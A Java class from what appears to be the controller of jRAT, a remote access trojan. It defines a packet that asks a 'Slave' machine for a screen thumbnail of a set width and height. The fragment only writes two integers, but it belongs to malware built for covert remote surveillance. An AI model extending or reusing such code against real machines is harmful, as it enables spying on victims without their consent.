package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet40Thumbnail extends AbstractOutgoingPacket {
	
	public static final int DEFAULT_WIDTH = 150;
	public static final int DEFAULT_HEIGHT = 100;
	
	private int width;
	private int height;
	
	public Packet40Thumbnail() {
		this(DEFAULT_WIDTH, DEFAULT_HEIGHT);
	}
	
	public Packet40Thumbnail(int width, int height) {
		if (width <= 0) {
			width = DEFAULT_WIDTH;
		}
		
		if (height <= 0) {
			height = DEFAULT_HEIGHT;
		}
		
		this.width = width;
		this.height = height;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(width);
		dos.writeInt(height);
	}

	@Override
	public short getPacketId() {
		return 40;
	}

}
